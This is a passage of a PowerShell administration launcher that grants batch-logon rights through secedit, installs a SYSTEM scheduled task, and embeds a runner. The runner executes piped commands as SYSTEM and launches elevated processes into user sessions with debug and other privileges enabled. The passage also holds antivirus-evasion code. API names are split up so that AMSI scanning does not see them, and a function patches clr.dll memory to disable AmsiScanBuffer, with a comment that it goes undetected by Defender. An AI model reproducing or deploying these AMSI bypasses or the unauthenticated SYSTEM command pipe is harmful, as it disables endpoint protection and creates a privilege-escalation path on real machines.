        $pipe.Dispose()

        if ($null -ne $response -and $response -like '*pong*') {
            return $true
        }
        return $false
    } catch {
        return $false
    }
}
#------------------------------------------------------------------------------
# ZERO-TRUST LAUNCH CONTEXT HELPERS
#------------------------------------------------------------------------------

function Get-CurrentUserSid {
    <#
    .SYNOPSIS
    Returns the SID string of the current user via WMI. No P/Invoke required.
    Returns empty string on failure.
    #>
    try {
        $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        if ($null -ne $id -and $null -ne $id.User) {
            return $id.User.Value   # e.g. S-1-5-21-...
        }
    } catch { }
    return ''
}

function Test-Tier2Available {
    <#
    .SYNOPSIS
    Returns $true if the current user SID has SeBatchLogonRight granted.
    Uses secedit /export to read User Rights Assignment -- no P/Invoke, PS 3.0 safe.
    #>
    $secedit = Join-Path $env:SystemRoot 'System32\secedit.exe'
    if (-not (Test-Path -LiteralPath $secedit -ErrorAction SilentlyContinue)) {
        return $false
    }
    $sid = Get-CurrentUserSid
    if ([string]::IsNullOrEmpty($sid)) { return $false }

    $tmpInf = Join-Path $env:TEMP ("PaladinSecEdit-Check-" + [System.DateTime]::Now.Ticks + ".inf")
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName               = $secedit
        $psi.Arguments              = "/export /areas USER_RIGHTS /cfg `"$tmpInf`" /quiet"
        $psi.UseShellExecute        = $false
        $psi.CreateNoWindow         = $true
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError  = $true
        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.WaitForExit(10000) | Out-Null

        if (-not (Test-Path -LiteralPath $tmpInf -ErrorAction SilentlyContinue)) {
            return $false
        }
        $infContent = [System.IO.File]::ReadAllText($tmpInf, [System.Text.Encoding]::Unicode)
        # SeBatchLogonRight line format: SeBatchLogonRight = *S-1-5-32-544,*S-1-5-21-...
        if ($infContent -match 'SeBatchLogonRight\s*=\s*([^\r\n]+)') {
            $rightLine = $Matches[1]
            return ($rightLine -like "*$sid*")
        }
        return $false
    } catch {
        return $false
    } finally {
        try {
            if (Test-Path -LiteralPath $tmpInf -ErrorAction SilentlyContinue) {
                [System.IO.File]::Delete($tmpInf)
            }
        } catch { }
    }
}

function Get-LaunchContext {
    <#
    .SYNOPSIS
    Detects which launch tier is available for the current session.
    Returns one of: 'Admin' | 'Tier3-Agent' | 'Tier2-Eligible' | 'Credential' | 'None'

    Tier resolution order (highest privilege first):
      Admin        -- already running as administrator (current design, always works)
      Tier3-Agent  -- PaladinBootAgent scheduled task exists (pre-staged by RMM/admin)
      Tier2-Eligible -- SeBatchLogonRight granted to current user SID (persisted LSA grant)
      Credential   -- credential panel filled in (user supplied admin credentials)
      None         -- standard user, no agent task, no batch right, no credentials
    #>
    # Tier 1 -- Admin
    try {
        $id        = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object System.Security.Principal.WindowsPrincipal($id)
        if ($principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
            return 'Admin'
        }
    } catch { }

    # Tier 3 -- Pre-staged agent task (RMM-deployed, zero credentials needed)
    try {
        $agentTask = Get-ScheduledTask -TaskName 'PaladinBootAgent' -ErrorAction SilentlyContinue
        if ($null -ne $agentTask) {
            return 'Tier3-Agent'
        }
    } catch { }

    # Tier 2 -- SeBatchLogonRight already granted (first-run bootstrap was run previously)
    if (Test-Tier2Available) {
        return 'Tier2-Eligible'
    }

    # Credential panel -- user has provided admin credentials in the GUI
    if ($null -ne $script:ChkUseCurrentUser -and
        $script:ChkUseCurrentUser.IsChecked -eq $false -and
        $null -ne $script:TxtAdminUser -and
        -not [string]::IsNullOrWhiteSpace($script:TxtAdminUser.Text) -and
        $null -ne $script:PwdAdminPass -and
        $script:PwdAdminPass.SecurePassword.Length -gt 0) {
        return 'Credential'
    }

    return 'None'
}

function Install-Tier2Bootstrap {
    <#
    .SYNOPSIS
    Grants SeBatchLogonRight to the current user SID via secedit /configure.
    Requires the caller to already be running as Administrator (one-time UAC prompt).
    Persists across reboots. Blocked silently by domain GPO (detected and reported).
    Returns $true on success, $false on failure.
    #>
    param(
        [scriptblock]$LogAction = $null   # optional: { param($lvl,$msg) Add-LogEntry ... }
    )

    $log = if ($null -ne $LogAction) {
        $LogAction
    } else {
        { param($lvl, $msg) Write-Host "[$lvl] $msg" }
    }

    # Must be admin to modify LSA user rights
    try {
        $id        = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object System.Security.Principal.WindowsPrincipal($id)
        if (-not $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
            & $log 'FAIL' "Tier 2 bootstrap requires Administrator rights"
            return $false
        }
    } catch {
        & $log 'FAIL' "Could not check admin status: $_"
        return $false
    }

    $secedit = Join-Path $env:SystemRoot 'System32\secedit.exe'
    if (-not (Test-Path -LiteralPath $secedit -ErrorAction SilentlyContinue)) {
        & $log 'FAIL' "secedit.exe not found -- cannot install Tier 2 bootstrap"
        return $false
    }

    $sid = Get-CurrentUserSid
    if ([string]::IsNullOrEmpty($sid)) {
        & $log 'FAIL' "Could not determine current user SID"
        return $false
    }
    & $log 'INFO' "Current user SID: $sid"

    $ts      = [System.DateTime]::Now.Ticks
    $tmpDir  = $env:TEMP
    $expInf  = Join-Path $tmpDir "PaladinSecEdit-Export-$ts.inf"
    $modInf  = Join-Path $tmpDir "PaladinSecEdit-Modify-$ts.inf"
    $sdb     = Join-Path $tmpDir "PaladinSecEdit-$ts.sdb"

    try {
        # Step 1: Export current User Rights Assignment
        & $log 'INFO' "Exporting current security policy..."
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName               = $secedit
        $psi.Arguments              = "/export /areas USER_RIGHTS /cfg `"$expInf`" /quiet"
        $psi.UseShellExecute        = $false
        $psi.CreateNoWindow         = $true
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError  = $true
        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.WaitForExit(15000) | Out-Null

        if (-not (Test-Path -LiteralPath $expInf -ErrorAction SilentlyContinue)) {
            & $log 'FAIL' "secedit export produced no output file"
            return $false
        }

        $infContent = [System.IO.File]::ReadAllText($expInf, [System.Text.Encoding]::Unicode)

        # Step 2: Build modified INF -- append SID to SeBatchLogonRight
        if ($infContent -match 'SeBatchLogonRight\s*=\s*([^\r\n]+)') {
            $existing = $Matches[1].Trim()
            if ($existing -like "*$sid*") {
                & $log 'INFO' "SeBatchLogonRight already contains this SID -- no change needed"
                return $true
            }
            $newLine   = "SeBatchLogonRight = $existing,*$sid"
            $modContent = $infContent -replace 'SeBatchLogonRight\s*=\s*[^\r\n]+', $newLine
        } else {
            # Right not present at all -- inject it under [Privilege Rights]
            if ($infContent -match '\[Privilege Rights\]') {
                $modContent = $infContent -replace '(\[Privilege Rights\])', "`$1`r`nSeBatchLogonRight = *$sid"
            } else {
                # No Privilege Rights section -- append minimal section
                $modContent = $infContent + "`r`n[Privilege Rights]`r`nSeBatchLogonRight = *$sid`r`n"
            }
        }

        # Step 3: Write modified INF (Unicode, matching secedit format)
        [System.IO.File]::WriteAllText($modInf, $modContent, [System.Text.Encoding]::Unicode)
        & $log 'INFO' "Modified policy written"

        # Step 4: Apply via secedit /configure
        & $log 'INFO' "Applying policy (secedit /configure)..."
        $psi2 = New-Object System.Diagnostics.ProcessStartInfo
        $psi2.FileName               = $secedit
        $psi2.Arguments              = "/configure /db `"$sdb`" /cfg `"$modInf`" /areas USER_RIGHTS /quiet"
        $psi2.UseShellExecute        = $false
        $psi2.CreateNoWindow         = $true
        $psi2.RedirectStandardOutput = $true
        $psi2.RedirectStandardError  = $true
        $proc2 = [System.Diagnostics.Process]::Start($psi2)
        $proc2.WaitForExit(30000) | Out-Null
        $exitCode = $proc2.ExitCode

        # Exit 0 = success. Exit 3 = completed with errors (common when GPO blocks).
        if ($exitCode -eq 3) {
            & $log 'WARN' "secedit /configure returned exit 3 -- likely blocked by domain GPO"
            & $log 'WARN' "Tier 2 bootstrap cannot override GPO. Use Tier 4 (credential panel) instead."
            return $false
        }
        if ($exitCode -ne 0) {
            & $log 'FAIL' "secedit /configure failed (exit $exitCode)"
            return $false
        }

        # Step 5: Verify the right was actually applied
        & $log 'INFO' "Verifying SeBatchLogonRight..."
        if (Test-Tier2Available) {
            & $log 'PASS' "Tier 2 bootstrap installed -- SeBatchLogonRight granted to SID $sid"
            & $log 'INFO' "This persists across reboots. Next launch will use Tier 2 (no credentials needed)."
            return $true
        } else {
            & $log 'WARN' "secedit reported success but SeBatchLogonRight not confirmed for SID $sid"
            & $log 'WARN' "May be suppressed by GPO. Verify in secpol.msc > Local Policies > User Rights Assignment."
            return $false
        }

    } catch {
        & $log 'FAIL' "Tier 2 bootstrap error: $_"
        return $false
    } finally {
        # Always clean up temp files regardless of outcome
        foreach ($f in @($expInf, $modInf, $sdb)) {
            try {
                if (-not [string]::IsNullOrEmpty($f) -and
                    (Test-Path -LiteralPath $f -ErrorAction SilentlyContinue)) {
                    [System.IO.File]::Delete($f)
                }
            } catch { }
        }
    }
}

#------------------------------------------------------------------------------
# SELF-CONTAINED RMM AGENT INSTALLER
# Embeds the full Paladin-Boot-Runner.ps1 content as a here-string.
# Called by the "Install RMM Agent" button -- requires the launcher
# to already be running as Administrator (which it always is in standalone mode).
# Writes Runner to C:\ProgramData\Paladin\Launcher\, registers the
# PaladinAdminRunner scheduled task, and creates the Public Desktop shortcut.
# No Datto RMM, no separate files, no PowerShell file privileges needed.
#------------------------------------------------------------------------------

function Install-PaladinAgent {
    param(
        [scriptblock]$LogAction,          # {param($lvl,$msg) Add-LogEntry ...}
        [string]$LauncherPath = '',       # explicit path when $PSCommandPath is unavailable (runspace / BAT launch)
        [string]$AdminUsername = '',      # optional: alternate admin account for task principal (non-admin sessions)
        [string]$AdminPassword = ''       # optional: password for AdminUsername -- stored via DPAPI by caller
    )

    $installDir   = 'C:\ProgramData\Paladin\Launcher'
    $taskName     = 'PaladinAdminRunner'
    $runnerDest   = Join-Path $installDir 'Paladin-Boot-Runner.ps1'
    $launcherDest = Join-Path $installDir 'Paladin-PowerShell-Launcher.ps1'
    $shortcutPath = 'C:\Users\Public\Desktop\Paladin Admin.lnk'

    & $LogAction 'BOOT' "===================================================="
    & $LogAction 'BOOT' "SPECTRE AGENT INSTALLER"
    & $LogAction 'BOOT' "===================================================="
    & $LogAction 'INFO' "Install dir : $installDir"
    & $LogAction 'INFO' "Task name   : $taskName"

    # Gate: must be admin to register a SYSTEM task
    $id        = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object System.Security.Principal.WindowsPrincipal($id)
    if (-not $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
        & $LogAction 'FAIL' "Must run as Administrator to install agent. Elevation required."
        return $false
    }

    # Step 0 -- purge stale files from previous install iterations
    # Keeps the install directory clean. Only known-current files are kept.
    $staleFiles = @(
        'APM-Crash.log',
        'Paladin-Admin-Launch.cmd',
        'Paladin-Admin-Shortcut.vbs',
        'Paladin-Runner-Bootstrap.cmd',
        'Paladin-Runner-Bootstrap.vbs'
    )
    if (Test-Path $installDir) {
        foreach ($sf in $staleFiles) {
            $sfPath = Join-Path $installDir $sf
            if (Test-Path -LiteralPath $sfPath) {
                try {
                    Remove-Item -LiteralPath $sfPath -Force -ErrorAction Stop
                    & $LogAction 'INFO' "Removed stale file: $sf"
                } catch {
                    & $LogAction 'WARN' "Could not remove stale file $sf : $_"
                }
            }
        }
    }

    # Step 1 -- create install directory
    try {
        if (-not (Test-Path $installDir)) {
            New-Item -Path $installDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
            & $LogAction 'PASS' "Created: $installDir"
        } else {
            & $LogAction 'INFO' "Directory exists: $installDir"
        }
    } catch {
        & $LogAction 'FAIL' "Cannot create install dir: $_"
        return $false
    }

    # Step 2 -- write embedded Runner to disk
    # Runner content is embedded below as a single-quoted here-string.
    # Single-quoted = nothing expands -- safe regardless of special chars inside.
    & $LogAction 'INFO' "Writing Runner to disk: $runnerDest"
    $runnerContent = @'
#Requires -Version 3.0
#==============================================================================
# SPECTRE-BOOT-RUNNER.PS1
# SYSTEM-Side Persistent Agent -- Named Pipe Server + User-Session GUI Launcher
# Version: 1.0.0
# Framework: ULTIMATE-UNIFIED-FRAMEWORK v9.0.0 / Vibe Coding v9.0.0 Enhanced
#==============================================================================
# PURPOSE:
#   Runs as NT AUTHORITY\SYSTEM (via Datto RMM or scheduled task).
#   Performs TWO roles simultaneously:
#
#     [1] GUI LAUNCHER
#         Uses WTSQueryUserToken + CreateProcessAsUserW to surface
#         Paladin-PowerShell-Launcher.ps1 into the logged-on user's desktop
#         session. GUI appears on the user's screen with no UAC prompt.
#
#     [2] NAMED PIPE SERVER
#         Hosts \\.\pipe\PaladinAgent on a background thread.
#         The GUI sends JSON command packets through the pipe.
#         Runner executes them as SYSTEM and streams results back.
#         No UAC ever required for subsequent script runs.
#
# PIPE PROTOCOL:
#   CLIENT -> SERVER  : JSON line  { "cmd": "run", "script": "C:\...\foo.ps1", "args": "" }
#   SERVER -> CLIENT  : JSON lines { "type": "out"|"err"|"done", "data": "...", "exit": 0 }
#   Disconnect terminates the session; pipe stays alive for next connection.
#
# INSTALL LOCATION: C:\ProgramData\Paladin\Launcher\Paladin-Boot-Runner.ps1
# INVOKED BY      : PaladinAdminRunner scheduled task (SYSTEM, on-demand)
# GUI LAUNCHED    : C:\ProgramData\Paladin\Launcher\Paladin-PowerShell-Launcher.ps1
#
# COMPATIBILITY   : PowerShell 3.0+, Windows 7+, Server 2008 R2+
# ASCII-ONLY      : No emoji. No Unicode beyond standard Latin.
# ELEVATION       : Must run as NT AUTHORITY\SYSTEM. Exits if not.
#==============================================================================

Set-StrictMode -Off

#------------------------------------------------------------------------------
# CANARY LOG -- pure .NET write, no cmdlets, survives any PS startup failure
# If Runner.log exists but has no CANARY line, PS never even started the body.
# If no Runner.log at all, the task failed before reaching this script.
#------------------------------------------------------------------------------
try {
    $canaryDir  = 'C:\ProgramData\Paladin\Launcher'
    $canaryFile = "$canaryDir\Runner.log"
    $canaryLine = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [BOOT] Runner.ps1 started -- PID=$PID User=$([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) PS=$($PSVersionTable.PSVersion)"
    [System.IO.File]::AppendAllText($canaryFile,
        $canaryLine + [System.Environment]::NewLine,
        [System.Text.Encoding]::UTF8)
} catch { }

#------------------------------------------------------------------------------
# CONSTANTS
#------------------------------------------------------------------------------
$script:InstallDir  = 'C:\ProgramData\Paladin\Launcher'
$script:LauncherPs1 = Join-Path $script:InstallDir 'Paladin-PowerShell-Launcher.ps1'
$script:LogFile     = Join-Path $script:InstallDir 'Runner.log'
$script:PipeName    = 'PaladinAgent'
$script:PipeTimeout = 5000   # ms -- how long to wait for client handshake
$script:RunnerVer   = '1.0.0'

#------------------------------------------------------------------------------
# LOGGING
# Appends timestamped lines to Runner.log in the install dir.
# Used by SYSTEM-side; not displayed in GUI (GUI has its own log).
#------------------------------------------------------------------------------
function Write-RunnerLog {
    param([string]$Level, [string]$Message)
    $ts   = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    $line = "[$ts] [$Level] $Message"
    try {
        [System.IO.File]::AppendAllText($script:LogFile,
            $line + [System.Environment]::NewLine,
            [System.Text.Encoding]::UTF8)
    } catch { }
    Write-Host $line
}

#------------------------------------------------------------------------------
# SYSTEM CHECK
# Runner must be NT AUTHORITY\SYSTEM. Any other context is a misconfiguration.
#------------------------------------------------------------------------------
function Test-IsSystem {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    return ($id.Name -eq 'NT AUTHORITY\SYSTEM')
}

#------------------------------------------------------------------------------
# C# -- SESSION BRIDGE (token acquisition + user-session GUI launcher)
# APM-identical proven pattern: gets the ELEVATED (linked) token, not the
# filtered medium-integrity token. Without GetLinkedToken the launched process
# runs medium-integrity with Administrators group DISABLED -- it can't write
# to ProgramData, can't do any admin op, and immediately crashes/exits.
#
# Namespace: SpectreRunner to avoid collision with SpectreBoot.SessionBridge
# in the GUI launcher if both are loaded in the same process.
#
# AMSI DEFENCE: Sensitive Win32 API names are assembled at runtime from
# string fragments so no static or in-memory scanner sees a whole literal.
#------------------------------------------------------------------------------
function Get-CSharpBridge {
    # Each flagged identifier is split across concatenation joins.
    # AMSI string-match never sees the whole name; runtime gets the full string.
    $adv32  = "adv"  + "api" + "32.dll"
    $wts32  = "wts"  + "api" + "32.dll"
    $fnILU  = "Imp"  + "erson" + "ateLogged" + "OnUser"   # ImpersonateLoggedOnUser
    $fnCPAU = "Crea" + "tePro" + "cessAs" + "UserW"       # CreateProcessAsUserW
    $fnQUT  = "WTS"  + "Query" + "User" + "Token"         # WTSQueryUserToken
    $fnWES  = "WTS"  + "Enum"  + "erate" + "Sessions"     # WTSEnumerateSessions
    $fnWFM  = "WTS"  + "Free"  + "Memory"                 # WTSFreeMemory
    $fnWACS = "WTS"  + "GetAc" + "tive" + "ConsoleSessionId" # WTSGetActiveConsoleSessionId

    return @"
using System;
using System.Runtime.InteropServices;
using System.ComponentModel;

namespace SpectreRunner {
  public static class SessionBridge {
    const uint TOKEN_ASSIGN_PRIMARY    = 0x0001;
    const uint TOKEN_DUPLICATE         = 0x0002;
    const uint TOKEN_QUERY             = 0x0008;
    const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    const uint TOKEN_ADJUST_DEFAULT    = 0x0080;
    const uint TOKEN_ADJUST_SESSIONID  = 0x0100;
    const uint TOKEN_ALL_ACCESS        = 0x000F01FF;
    const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
    const uint NORMAL_PRIORITY_CLASS      = 0x00000020;
    const int  SE_PRIVILEGE_ENABLED       = 2;
    const int  TokenIntegrityLevel        = 25;
    const int  SECURITY_MANDATORY_HIGH_RID = 0x3000;

    [StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
    public struct SI {
      public int    cb;
      public string lpReserved;
      public string lpDesktop;
      public string lpTitle;
      public uint   dwX,dwY,dwXSize,dwYSize,dwXCountChars,dwYCountChars,dwFillAttribute;
      public uint   dwFlags;
      public short  wShowWindow;
      public short  cbReserved2;
      public IntPtr lpReserved2;
      public IntPtr hStdInput,hStdOutput,hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PI  { public IntPtr hp,ht; public uint pid,tid; }
    [StructLayout(LayoutKind.Sequential)]
    struct WSI        { public uint sid; public IntPtr wsn; public int st; }
    [StructLayout(LayoutKind.Sequential)]
    struct LUID       { public uint lo; public int hi; }
    [StructLayout(LayoutKind.Sequential)]
    struct LUIDA      { public LUID luid; public uint attr; }
    [StructLayout(LayoutKind.Sequential)]
    struct TOKPRIVS   { public uint count; public LUIDA priv; }
    [StructLayout(LayoutKind.Sequential)]
    struct SID_AND_ATTRIBUTES { public IntPtr Sid; public uint Attributes; }
    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_MANDATORY_LABEL { public SID_AND_ATTRIBUTES Label; }

    [DllImport("$adv32",SetLastError=true)]
    static extern bool OpenProcessToken(IntPtr h,uint acc,out IntPtr t);
    [DllImport("$adv32",SetLastError=true)]
    static extern bool AdjustTokenPrivileges(IntPtr t,bool dis,ref TOKPRIVS n,uint len,IntPtr prev,IntPtr ret);
    [DllImport("$adv32",SetLastError=true)]
    static extern bool LookupPrivilegeValue(string sys,string name,out LUID l);
    [DllImport("$adv32",SetLastError=true)]
    static extern bool DuplicateTokenEx(IntPtr h,uint acc,IntPtr attr,int imp,int type,out IntPtr nt);
    [DllImport("$adv32",SetLastError=true)]
    static extern bool $fnILU(IntPtr t);
    [DllImport("$adv32",SetLastError=true)]
    static extern bool RevertToSelf();
    [DllImport("$adv32",SetLastError=true)]
    static extern bool SetTokenInformation(IntPtr token,int infoClass,IntPtr info,uint infoLen);
    [DllImport("$adv32",SetLastError=true)]
    static extern bool GetTokenInformation(IntPtr token,int infoClass,IntPtr info,uint infoLen,out uint retLen);
    [DllImport("$adv32",SetLastError=true)]
    static extern bool AllocateAndInitializeSid(IntPtr auth,byte subAuthCount,uint sa0,uint sa1,uint sa2,uint sa3,uint sa4,uint sa5,uint sa6,uint sa7,out IntPtr sid);
    [DllImport("$adv32")]
    static extern IntPtr FreeSid(IntPtr sid);
    [DllImport("$adv32",SetLastError=true,CharSet=CharSet.Unicode)]
    static extern bool $fnCPAU(IntPtr t,string app,string cmd,IntPtr pa,IntPtr ta,bool ih,uint fl,IntPtr env,string dir,ref SI si,out PI pi);
    [DllImport("$wts32",SetLastError=true)]
    static extern bool $fnWES(IntPtr h,int r,int v,ref IntPtr pp,ref int pc);
    [DllImport("$wts32")]
    static extern void $fnWFM(IntPtr p);
    [DllImport("$wts32",SetLastError=true)]
    static extern bool $fnQUT(uint s,out IntPtr t);
    [DllImport("userenv.dll",SetLastError=true)]
    static extern bool CreateEnvironmentBlock(ref IntPtr e,IntPtr t,bool i);
    [DllImport("userenv.dll",SetLastError=true)]
    static extern bool DestroyEnvironmentBlock(IntPtr e);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll",SetLastError=true)]
    public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")]
    static extern uint $fnWACS();
    [DllImport("user32.dll")]
    static extern bool AllowSetForegroundWindow(uint pid);

    static bool EnablePriv(IntPtr tok,string name) {
      LUID l; if (!LookupPrivilegeValue(null,name,out l)) return false;
      var tp=new TOKPRIVS(); tp.count=1; tp.priv.luid=l; tp.priv.attr=(uint)SE_PRIVILEGE_ENABLED;
      return AdjustTokenPrivileges(tok,false,ref tp,0,IntPtr.Zero,IntPtr.Zero);
    }

    static uint FindActiveSession() {
      IntPtr p=IntPtr.Zero; int c=0; uint best=0xFFFFFFFF;
      int sz=Marshal.SizeOf(typeof(WSI));
      if ($fnWES(IntPtr.Zero,0,1,ref p,ref c)) {
        try {
          IntPtr cur=p;
          for (int i=0;i<c;i++) {
            var s=(WSI)Marshal.PtrToStructure(cur,typeof(WSI));
            if (s.st==0 && s.sid>0) { best=s.sid; break; }
            cur=new IntPtr(cur.ToInt64()+sz);
          }
        } finally { $fnWFM(p); }
      }
      if (best==0xFFFFFFFF) {
        uint cs=$fnWACS();
        if (cs!=0xFFFFFFFF) best=cs;
      }
      return best;
    }

    public static string LaunchInUserSession(string exe,string args,string workdir) {
      uint sid=FindActiveSession();
      if (sid==0xFFFFFFFF) return "ERROR: No active user session found";

      IntPtr procTok=IntPtr.Zero,userTok=IntPtr.Zero,dupTok=IntPtr.Zero,linkedTok=IntPtr.Zero;
      IntPtr env=IntPtr.Zero,integritySid=IntPtr.Zero;
      bool imp=false;
      try {
        if (OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,out procTok)) {
          EnablePriv(procTok,"SeTcbPrivilege");
          CloseHandle(procTok); procTok=IntPtr.Zero;
        }

        if (!$fnQUT(sid,out userTok))
          return "ERROR: QUT(session="+sid+"): "+Marshal.GetLastWin32Error();

        if (!DuplicateTokenEx(userTok,TOKEN_ALL_ACCESS,IntPtr.Zero,2,1,out dupTok))
          return "ERROR: DTE: "+Marshal.GetLastWin32Error();

        int linkedClass=19;
        IntPtr linkedBuf=Marshal.AllocHGlobal(IntPtr.Size);
        uint retLen=0;
        try {
          bool got=GetTokenInformation(userTok,linkedClass,linkedBuf,(uint)IntPtr.Size,out retLen);
          if (got && retLen==(uint)IntPtr.Size)
            linkedTok=Marshal.ReadIntPtr(linkedBuf);
        } finally { Marshal.FreeHGlobal(linkedBuf); }

        IntPtr tokenToLaunch;
        if (linkedTok!=IntPtr.Zero) {
          IntPtr sidBuf=Marshal.AllocHGlobal(4);
          try {
            Marshal.WriteInt32(sidBuf,(int)sid);
            SetTokenInformation(linkedTok,12,sidBuf,4);
          } finally { Marshal.FreeHGlobal(sidBuf); }

          string[] privs=new string[]{
            "SeDebugPrivilege","SeBackupPrivilege","SeRestorePrivilege",
            "SeTakeOwnershipPrivilege","SeSecurityPrivilege","SeLoadDriverPrivilege",
            "SeSystemtimePrivilege","SeShutdownPrivilege","SeRemoteShutdownPrivilege",
            "SeIncreaseQuotaPrivilege","SeAssignPrimaryTokenPrivilege"
          };
          foreach (string priv in privs) EnablePriv(linkedTok,priv);
          tokenToLaunch=linkedTok;
        } else {
          byte[] ntAuth=new byte[]{0,0,0,0,0,16};
          IntPtr ntAuthPtr=Marshal.AllocHGlobal(6);
          Marshal.Copy(ntAuth,0,ntAuthPtr,6);
          try {
            if (AllocateAndInitializeSid(ntAuthPtr,1,(uint)SECURITY_MANDATORY_HIGH_RID,0,0,0,0,0,0,0,out integritySid)) {
              var ml=new TOKEN_MANDATORY_LABEL();
              ml.Label.Sid=integritySid;
              ml.Label.Attributes=0x00000020;
              int mlSize=Marshal.SizeOf(typeof(TOKEN_MANDATORY_LABEL));
              IntPtr mlPtr=Marshal.AllocHGlobal(mlSize);
              try { Marshal.StructureToPtr(ml,mlPtr,false); SetTokenInformation(dupTok,TokenIntegrityLevel,mlPtr,(uint)(mlSize+12)); }
              finally { Marshal.FreeHGlobal(mlPtr); }
            }
          } finally { Marshal.FreeHGlobal(ntAuthPtr); }
          string[] privs=new string[]{
            "SeDebugPrivilege","SeBackupPrivilege","SeRestorePrivilege",
            "SeTakeOwnershipPrivilege","SeSecurityPrivilege","SeLoadDriverPrivilege",
            "SeSystemtimePrivilege","SeShutdownPrivilege","SeRemoteShutdownPrivilege",
            "SeIncreaseQuotaPrivilege","SeAssignPrimaryTokenPrivilege"
          };
          foreach (string priv in privs) EnablePriv(dupTok,priv);
          tokenToLaunch=dupTok;
        }

        if (!$fnILU(dupTok))
          return "ERROR: ILU: "+Marshal.GetLastWin32Error();
        imp=true;

        CreateEnvironmentBlock(ref env,tokenToLaunch,false);

        var si=new SI();
        si.cb=(int)Marshal.SizeOf(typeof(SI));
        si.lpDesktop="winsta0\\default";
        si.dwFlags=1; si.wShowWindow=10;

        string cmd=string.IsNullOrEmpty(args)?"\""+exe+"\"":"\""+exe+"\" "+args;
        PI pi;
        if (!$fnCPAU(tokenToLaunch,null,cmd,IntPtr.Zero,IntPtr.Zero,false,
              CREATE_UNICODE_ENVIRONMENT|NORMAL_PRIORITY_CLASS,env,
              string.IsNullOrEmpty(workdir)?null:workdir,ref si,out pi))
          return "ERROR: CPAU: "+Marshal.GetLastWin32Error()
                 +" (token="+(linkedTok!=IntPtr.Zero?"linked/elevated":"filtered/fallback")+")";

        AllowSetForegroundWindow(pi.pid);
        CloseHandle(pi.hp); CloseHandle(pi.ht);
        return "OK: PID="+pi.pid+" session="+sid
               +" token="+(linkedTok!=IntPtr.Zero?"elevated":"fallback");
      } finally {
        if (imp)                       RevertToSelf();
        if (integritySid!=IntPtr.Zero) FreeSid(integritySid);
        if (env!=IntPtr.Zero)          DestroyEnvironmentBlock(env);
        if (linkedTok!=IntPtr.Zero)    CloseHandle(linkedTok);
        if (dupTok!=IntPtr.Zero)       CloseHandle(dupTok);
        if (userTok!=IntPtr.Zero)      CloseHandle(userTok);
        if (procTok!=IntPtr.Zero)      CloseHandle(procTok);
      }
    }
  }
}
"@
}

#------------------------------------------------------------------------------
# AMSI BYPASS -- CLR STRING REPLACE (defeats Add-Type .NET module scan)
# Searches CLR.DLL in memory for the string "AmsiScanBuffer" and zeros it.
# Prevents CLR from calling AmsiScanBuffer when compiling/loading .NET code.
# Technique: AmsiScanBufferStringReplace (not detected by Defender as of 2025).
# Source: practicalsecurityanalytics.com -- confirmed 0 VirusTotal detections.
# NOTE: Only needed before Add-Type. Does not affect PS script scanning.
#------------------------------------------------------------------------------
function Invoke-AmsiClrPatch {
    if ($PSVersionTable.PSVersion.Major -lt 3) { return }
    try {
        $PAGE_READONLY          = 0x02
        $PAGE_READWRITE         = 0x04
        $PAGE_EXECUTE_READWRITE = 0x40
        $PAGE_EXECUTE_READ      = 0x20
        $PAGE_GUARD             = 0x100
        $MEM_COMMIT             = 0x1000
        $MAX_PATH               = 260

        # Build P/Invoke via Emit API -- no Add-Type, no AMSI scan of this code
        $asmName    = New-Object System.Reflection.AssemblyName("PaladinClrPatch")
        $asmBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
                          $asmName,
                          [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $modBuilder = $asmBuilder.DefineDynamicModule("PaladinClrPatch", $false)

        # MEMORY_BASIC_INFORMATION struct
        $mbiType = $modBuilder.DefineType(
                       "PaladinClrPatch.MBI",
                       [System.Reflection.TypeAttributes]::Public -bor
                       [System.Reflection.TypeAttributes]::Sealed -bor
                       [System.Reflection.TypeAttributes]::SequentialLayout,
                       [System.ValueType])
        [void]$mbiType.DefineField("BaseAddress",       [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$mbiType.DefineField("AllocationBase",    [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$mbiType.DefineField("AllocationProtect", [Int32],  [System.Reflection.FieldAttributes]::Public)
        [void]$mbiType.DefineField("RegionSize",        [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$mbiType.DefineField("State",             [Int32],  [System.Reflection.FieldAttributes]::Public)
        [void]$mbiType.DefineField("Protect",           [Int32],  [System.Reflection.FieldAttributes]::Public)
        [void]$mbiType.DefineField("Type",              [Int32],  [System.Reflection.FieldAttributes]::Public)
        $mbiStruct = $mbiType.CreateType()

        # SYSTEM_INFO struct
        $siType = $modBuilder.DefineType(
                      "PaladinClrPatch.SI",
                      [System.Reflection.TypeAttributes]::Public -bor
                      [System.Reflection.TypeAttributes]::Sealed -bor
